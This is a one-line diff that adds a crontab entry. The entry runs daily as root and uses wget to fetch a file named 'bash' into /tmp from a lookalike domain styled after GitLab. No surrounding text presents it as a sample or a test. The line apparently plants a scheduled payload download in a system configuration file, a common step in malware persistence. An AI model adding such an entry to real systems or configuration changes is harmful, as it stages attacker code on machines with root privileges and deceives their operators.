@@ -1,0 +1,1 @@
+0 6 * * * root wget -P /tmp http://www.dev.mail-issue-gitlab.com/bash
